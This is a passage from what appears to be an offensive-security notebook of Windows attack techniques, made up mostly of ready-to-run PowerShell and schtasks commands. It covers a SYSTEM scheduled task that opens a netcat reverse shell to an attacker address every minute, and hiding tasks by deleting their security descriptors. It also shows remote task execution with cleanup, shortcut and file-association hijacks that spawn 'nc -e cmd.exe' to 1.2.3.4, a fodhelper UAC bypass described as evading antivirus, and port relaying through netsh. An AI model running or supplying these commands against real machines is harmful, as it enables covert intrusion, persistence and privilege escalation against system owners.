<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Creates a task that executes a netcat reverse shell back to</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># the attacker. &quot;/sc&quot; and &quot;/mo&quot; indicate that the task should</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># be run every minute. &quot;/ru&quot; indicates that the task will run</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># with SYSTEM privileges.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">schtasks </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">create </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">sc minute </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">mo </span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;">1</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">tn </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TASK_NAME</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">	/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">tr </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">NETCAT_PATH -e cmd.exe </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">ATTACKER_IP </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">ATTACKER_PORT</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">	/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">ru SYSTEM</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Checks to see if the task was created successfully.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">schtasks </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">query </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">tn </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TASK_NAME</span></span></code></pre></figure>
<h2 id="stealthy-tasks">Stealthy tasks<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#stealthy-tasks" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="how-to-hide-windows-tasks-using-psexec" data-block data-embed-alias="undefined"><h1>How to hide Windows tasks using PsExec</h1><p>Deleting the task <strong>Security Descriptor</strong> will make the task invisible to any user in the system. <em>Note that this requires PsExec!</em></p>
<ol>
<li>
<p>Use <code>PsExec64.exe -s -i regedit</code> to open regedit with SYSTEM privileges.</p>
</li>
<li>
<p>Search in <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\</code> for the task to hide. Under the key for that task, there will be a value named SD that contains the security descriptor. Simply delete it.</p>
</li>
</ol><a href="../spellbook/how-to-manipulate-local-windows-tasks/../../spells/how-to-hide-windows-tasks-using-psexec" class="internal transclude-src">Link to original</a></blockquote><p></p><a href="../spellbook/how-to-exploit-windows-tasks/../../spellbook/how-to-manipulate-local-windows-tasks" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="remote-tasks">Remote tasks<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#remote-tasks" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="how-to-manipulate-remote-windows-tasks" data-block data-embed-alias="undefined"><h1>How to manipulate remote Windows tasks</h1><blockquote class="callout tip" data-callout="tip">
<div class="callout-title">
                  <div class="callout-icon"></div>
                  <div class="callout-title-inner"><p>IMPORTANT</p></div>
                  
                </div>
<div class="callout-content">
<p>By default, UAC restricts remote schtasks calls to domain admins and the default local “Administrator” account. <em>Local <a href="../spells/how-to-manipulate-remote-windows-tasks/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> admins cannot call this service remotely without first disabling UAC!</em></p>
</div>
</blockquote>
<p>The schtasks command can also be used to create and manipulate services on <em>remote</em> machines. This uses the <a href="../spells/how-to-manipulate-remote-windows-tasks/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> RPC (<a href="../spells/how-to-manipulate-remote-windows-tasks/../../spellbook/tcp" class="internal alias" data-slug="spellbook/tcp">TCP</a> 135), but will fall back to named pipes over <a href="../spells/how-to-manipulate-remote-windows-tasks/../../spellbook/cifs" class="internal alias" data-slug="spellbook/cifs">SMB</a> (<a href="../spells/how-to-manipulate-remote-windows-tasks/../../spellbook/tcp" class="internal alias" data-slug="spellbook/tcp">TCP</a> 445) or NetBIOS (<a href="../spells/how-to-manipulate-remote-windows-tasks/../../spellbook/tcp" class="internal alias" data-slug="spellbook/tcp">TCP</a> 139). (In fact, this is how <code>schtasks </code> works locally as well; the only difference is that in this case a local named pipe is always used.)</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Create $ATTACKER_TASK on the $TARGET_HOST. Note that /sd</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># (start date) and /st (start time) don't matter if we're</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># invoking the task manually, as we do next.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">schtasks </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">s </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_HOST</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">RU </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">SYSTEM</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">create </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">`</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">         /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">tn </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">ATTACKER_TASK</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">tr </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">SOME_COMMAND</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">sc ONCE </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">`</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">         /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">sd </span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;">06</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;">25</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;">2023</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">st </span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;">16</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;">10</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Invoke $ATTACKER_TASK.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">schtasks </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">s </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_HOST</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">run </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">TN </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">ATTACKER_TASK</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Clean up after yourself.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">schtasks </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">S </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_HOST</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">TN </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">ATTACKER_TASK</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">DELETE </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">F</span></span></code></pre></figure><a href="../spellbook/how-to-exploit-windows-tasks/../../spells/how-to-manipulate-remote-windows-tasks" class="internal transclude-src">Link to original</a></blockquote><p></p><a href="../spellbook/how-to-exploit-windows-tasks" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="shortcut-files">Shortcut files<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#shortcut-files" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="how-to-exploit-windows-shortcut-files" data-block data-embed-alias="undefined"><h1>How to exploit Windows shortcut files</h1><p>Shortcuts can be modified to run a script instead. A simple <a href="../spells/how-to-exploit-windows-shortcut-files/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a> script that fires off one executable and then another might look like:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Create a reverse shell (note that netcat is something that</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># the attacker need to provide themselves!)</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Start-Process</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">NoNewWindow </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">C:\Windows\System32\nc.exe</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">	&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">-e cmd.exe 1.2.3.4 1337</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Fire off the application the user is expecting</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">C:\Windows\System32\</span><span style="--shiki-light:#998418;--shiki-dark:#998418;">calc.exe</span></span></code></pre></figure>
<p>To ensure that the script itself doesn’t generate a <a href="../spells/how-to-exploit-windows-shortcut-files/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a> window, it will need to be called like so:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">powershell.exe</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">WindowStyle </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">hidden</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> C:\Windows\System32\calc.ps1</span></span></code></pre></figure><a href="../spells/how-to-exploit-windows-shortcut-files" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="file-associations">File associations<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#file-associations" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="how-to-exploit-windows-file-associations" data-block data-embed-alias="undefined"><h1>How to exploit Windows file associations</h1><p>Hijacking file associations is the same basic idea as <a href="../spells/how-to-exploit-windows-file-associations/../../spells/how-to-exploit-windows-shortcut-files" class="internal alias" data-slug="spells/how-to-exploit-windows-shortcut-files">hijacking shortcut files</a>. This is a two-step process.</p>
<ol>
<li>Locate the “programmatic ID” of the extension you wish to hijack under <code>HKLM\Software\Classes</code> (this will be the key’s <code>(Default)</code> value).</li>
<li>The programmatic ID will <em>also</em> be in <code>HKLM\Software\Classes</code> and will have the command path as the <code>(Default)</code> value for its <code>shell\open\command</code> key.</li>
</ol>
<p>Note that the programmatic ID command will probably include the <code>%1</code> placeholder, which is used to pass in the file path. This requires a slightly different script than is used to backdoor shortcuts:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Create a reverse shell (note that netcat is something that</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># the attacker need to provide themselves!)</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Start-Process</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">NoNewWindow </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">C:\Windows\System32\nc.exe</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">	&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">-e cmd.exe 1.2.3.4 1337</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Fire off the application the user is expecting and pass in</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># the supplied file path</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">C:\Windows\System32\</span><span style="--shiki-light:#998418;--shiki-dark:#998418;">notepad.exe</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#998418;--shiki-dark:#998418;">args</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span></span></code></pre></figure>
<p>Note the quoting here, as well as the inclusion of the entire <code>$args</code> array. Most of the documentation I’ve found online suggests using <code>$args[0]</code> as an <em>unquoted</em> argument, but this approach did not work in my testing.</p><a href="../spells/how-to-exploit-windows-file-associations" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="feature-on-demand-helper">“Feature on demand” helper<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#feature-on-demand-helper" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="how-to-exploit-the-windows-feature-on-demand-helper" data-block data-embed-alias="undefined"><h1>How to exploit the Windows “Feature on Demand” Helper</h1><p><a href="https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses" class="external" target="_blank">The fodhelper binary can be abused to gain an admin shell on <svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a><a href="../spells/how-to-exploit-the-windows-feature-on-demand-helper/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> boxes with a couple of registry key changes. They key (heh) here is to use the CurVer registry key to point fodhelper.exe to a different registry location; otherwise most AV solutions will catch this change and block it (though sometimes the command will still execute).</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">New-Item</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">HKCU:\Software\Classes\.pwn\Shell\Open\command</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Force</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Set-ItemProperty</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">HKCU:\Software\Classes\.pwn\Shell\Open\command</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">	-</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Name </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">(default)</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Value </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">cmd.exe /c start powershell.exe</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Force</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">    </span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">New-Item</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Path </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">HKCU:\Software\Classes\ms-settings\CurVer</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Force</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Set-ItemProperty</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">  &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">HKCU:\Software\Classes\ms-settings\CurVer</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">	-</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Name </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">(default)</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">value </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">.pwn</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Force</span></span></code></pre></figure><a href="../spells/how-to-exploit-the-windows-feature-on-demand-helper" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="use-the-windows-firewall-to-relay-ports">Use the Windows Firewall to relay ports<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#use-the-windows-firewall-to-relay-ports" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="how-to-use-the-windows-firewall-to-relay-ports" data-block data-embed-alias="undefined"><h1>How to use the Windows Firewall to relay ports</h1><blockquote class="callout info" data-callout="info">
<div class="callout-title">
                  <div class="callout-icon"></div>
                  <div class="callout-title-inner"><p>Adapted from <a href="https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_UsefulCommands.txt#L14" class="external" target="_blank">slyth11907 / Cheatsheets / Cheatsheet_UsefulCommands.txt<svg class="external-icon" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a>.</p></div>
                  
                </div>
</blockquote>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">netsh interface portproxy add v4tov4 </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">`</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">      listenport</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">LOCAL_PORT</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> listenaddress</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=</span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;">0.0</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">.</span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;">0.0</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">      connectport</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">REMOTE_PORT</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> connectaddress</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">=$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">REMOTE_IP</span></span></code></pre></figure>
